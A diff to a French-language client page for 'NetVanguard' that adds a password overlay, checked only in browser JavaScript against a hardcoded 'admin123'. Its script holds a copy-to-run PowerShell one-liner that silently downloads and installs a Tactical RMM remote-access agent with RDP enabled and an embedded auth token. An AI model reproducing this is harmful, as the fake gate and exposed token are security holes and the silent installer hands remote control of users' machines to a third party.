@@ -45,13 +45,102 @@
     }
     a { text-decoration: none; }
 
+    /* PASSWORD OVERLAY */
+    .password-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(2, 8, 16, 0.97);
+      backdrop-filter: blur(20px);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    .password-overlay.hidden {
+      display: none;
+    }
+    .password-box {
+      background: linear-gradient(160deg, rgba(255,255,255,0.04), rgba(15,43,77,0.3));
+      border: 1px solid rgba(0,212,255,0.2);
+      border-radius: 20px;
+      padding: 2.5rem 2rem;
+      text-align: center;
+      max-width: 420px;
+      width: 90%;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+    }
+    .password-box .shield-icon {
+      font-size: 3rem;
+      color: var(--accent);
+      margin-bottom: 1rem;
+      filter: drop-shadow(0 0 15px rgba(0, 212, 255, 0.5));
+    }
+    .password-box h2 {
+      color: var(--white);
+      margin-bottom: 0.5rem;
+      font-size: 1.3rem;
+    }
+    .password-box p {
+      color: var(--gray-light);
+      font-size: 0.85rem;
+      margin-bottom: 1.5rem;
+    }
+    .password-input-group {
+      display: flex;
+      gap: 0.5rem;
+    }
+    .password-input-group input {
+      flex: 1;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(0,212,255,0.2);
+      padding: 0.75rem 1rem;
+      border-radius: 10px;
+      color: var(--white);
+      font-family: inherit;
+      font-size: 1rem;
+      outline: none;
+      transition: var(--transition);
+    }
+    .password-input-group input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 15px rgba(0,212,255,0.15);
+    }
+    .password-input-group input::placeholder {
+      color: var(--gray-mid);
+    }
+    .password-input-group button {
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      border: none;
+      color: var(--primary-deep);
+      padding: 0.75rem 1.5rem;
+      border-radius: 10px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.95rem;
+      transition: var(--transition);
+      white-space: nowrap;
+    }
+    .password-input-group button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(0,212,255,0.35);
+    }
+    .password-error {
+      color: var(--red);
+      font-size: 0.8rem;
+      margin-top: 0.8rem;
+      min-height: 1.2rem;
+      transition: all 0.3s ease;
+    }
+
     /* CURSOR GLOW */
     @media (min-width: 1025px) {
       .cursor-glow {
         width: 500px; height: 500px; position: fixed; left: 0; top: 0;
         transform: translate(-50%, -50%);
         background: radial-gradient(circle, rgba(0, 212, 255, 0.04), transparent 70%);
-        pointer-events: none; z-index: 9999;
+        pointer-events: none; z-index: 9998;
         border-radius: 50%;
       }
     }
@@ -544,6 +633,22 @@
 </head>
 <body>
 
+<!-- PASSWORD OVERLAY -->
+<div class="password-overlay" id="passwordOverlay">
+  <div class="password-box">
+    <div class="shield-icon">
+      <i class="fa-solid fa-lock"></i>
+    </div>
+    <h2>Accès Sécurisé</h2>
+    <p>Cette page est réservée aux clients NetVanguard.<br>Veuillez entrer le mot de passe pour continuer.</p>
+    <div class="password-input-group">
+      <input type="password" id="passwordInput" placeholder="Mot de passe" autocomplete="off">
+      <button onclick="checkPassword()"><i class="fa-solid fa-arrow-right-to-bracket"></i> Accéder</button>
+    </div>
+    <div class="password-error" id="passwordError"></div>
+  </div>
+</div>
+
 <div class="cursor-glow" id="cursorGlow"></div>
 
 <!-- TOP BAR -->
@@ -735,6 +840,37 @@
 </div>
 
 <script>
+  // ========== PASSWORD PROTECTION ==========
+  const CORRECT_PASSWORD = "admin123"; // CHANGEZ CE MOT DE PASSE ICI
+  
+  function checkPassword() {
+    const input = document.getElementById('passwordInput');
+    const error = document.getElementById('passwordError');
+    const overlay = document.getElementById('passwordOverlay');
+    
+    if (input.value === CORRECT_PASSWORD) {
+      overlay.classList.add('hidden');
+      error.textContent = '';
+    } else {
+      error.textContent = '⛔ Mot de passe incorrect. Veuillez réessayer.';
+      input.value = '';
+      input.focus();
+      // Animation de secousse
+      input.style.borderColor = 'var(--red)';
+      setTimeout(() => {
+        input.style.borderColor = 'rgba(0,212,255,0.2)';
+      }, 600);
+    }
+  }
+  
+  // Permettre d'appuyer sur Entrée pour valider
+  document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      checkPassword();
+    }
+  });
+
+  // ========== EXISTING CODE ==========
   const exitUrl = "https://netvanguard.ma/index.html";
 
   const scriptToCopy = `$ErrorActionPreference = 'Stop'; Invoke-WebRequest -Uri "https://rmm.nextgentechnologies.net/dl/tacticalagent-v2.10.0-windows-amd64.exe" -OutFile "$env:TEMP\\tacticalagent.exe"; Start-Process "$env:TEMP\\tacticalagent.exe" -ArgumentList '/VERYSILENT /SUPPRESSMSGBOXES' -Wait; & "C:\\Program Files\\TacticalAgent\\tacticalrmm.exe" -m install --api https://api.rmm.nextgentechnologies.net --client-id 1 --site-id 1 --agent-type workstation --auth d432d9944a0eb82a8f5c0db6107f69a28ff8f1b8fe7d3a3e2a10ee487a359e59 --rdp --ping --power`;
